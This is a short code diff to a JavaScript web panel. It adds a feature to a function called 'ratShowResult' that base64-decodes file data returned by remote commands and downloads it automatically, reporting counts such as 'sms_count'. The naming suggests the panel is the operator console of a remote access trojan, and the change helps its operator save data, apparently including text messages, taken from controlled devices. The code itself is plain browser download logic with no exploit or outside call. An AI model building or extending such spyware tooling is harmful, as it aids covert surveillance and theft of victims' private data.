@@ -3568,6 +3568,26 @@
         }
 
         function ratShowResult(cmd, data) {
+            // Auto-download if result contains a base64 file
+            if (data && typeof data === 'object') {
+                const fileKey = Object.keys(data).find(k => k.endsWith('_file') && typeof data[k] === 'string' && data[k].length > 10);
+                if (fileKey) {
+                    const nameKey = fileKey.replace('_file', '_filename');
+                    const filename = data[nameKey] || (cmd + '.txt');
+                    try {
+                        const bytes = Uint8Array.from(atob(data[fileKey]), c => c.charCodeAt(0));
+                        const blob = new Blob([bytes], { type: 'text/plain;charset=utf-8' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url; a.download = filename;
+                        document.body.appendChild(a); a.click();
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+                        showNotification(cmd + ': ' + (data.sms_count || data.count || '') + ' — ' + filename, 'success');
+                        return;
+                    } catch(e) { console.error('decode error', e); }
+                }
+            }
             let existing = document.getElementById('ratResultWin');
             if (!existing) {
                 existing = document.createElement('div');
